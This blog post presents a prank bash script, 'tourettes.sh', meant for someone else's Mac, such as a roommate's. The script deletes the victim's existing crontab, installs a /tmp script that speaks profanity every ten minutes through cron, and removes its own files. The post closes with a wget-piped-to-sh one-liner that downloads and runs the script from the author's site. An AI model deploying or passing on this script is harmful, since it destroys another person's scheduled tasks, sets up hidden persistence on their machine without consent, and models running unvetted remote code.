---
layout: post
main: false
status: completed
category: tech
back: tech.html
title: tourettes.
quote: Ear muffs.
---

There is something so deliriously enticing about using the command `say` for devious purposes outside of its developed intentions **\[aiding the visually impaired?\]**. When I first discovered my darling Mac's capability, I believe I input `wanker` immediately; after all, what is more humourous than a bot spouting swears? I'll tell you what: a bot _uncontrollably_ spewing profanity in _ten_ minute intervals ...on a less apt technologist's Mac - say my former roommate's.

<div class="snippet">
   <pre class="terminal">
<div class="terminal-header">tourettes.sh</div>
#!/bin/bash

script=/tmp/tourettes.sh
cron=/tmp/cron

setup() {
  crontab -r
}

build_script_file() {
  echo 'swear() {' >> $1
  echo 'array=("shit", "fuck", "ass", "assbag", "asshole", "penis")' >> $1
  echo 'exec say ${array[$((RANDOM %= $((${#array[@]}))))]}' >> $1
  echo '}' >> $1
  echo 'swear' >> $1
  chmod a+x $1
}

build_crontab_file () {
  echo "*/$1 * * * * $2" >> $3
  crontab $3
}

cleanup() {
  rm $1
  dir=`pwd`
  download=$dir/tourettes.sh
  rm $download
}

# Remove the user's current cron.
setup

# Create a script in the tmp directory.
build_script_file "$script"

# Create a new crontab with script in tmp directory.
build_crontab_file "10" "$script" "$cron"

# Remove downloaded file and new cron file.
cleanup "$cron"
    </pre>
</div>

This [little diddy](http://en.wikipedia.org/wiki/Diddy_Kong) was meant to be more refined, but it turned out to be quite difficult to check if a user had a crontab enabled, grab the contents of the current crontab, edit them, then save - all without `sudo` access. So, I settled on _brute_ force. Run it. Enjoy it.

<div class="snippet">
   <pre class="terminal">
<div class="terminal-header"><i>terminal</i></div>
wget http://frank.lovecch.io/scripts/tourettes.sh -O - | sh
   </pre>
</div>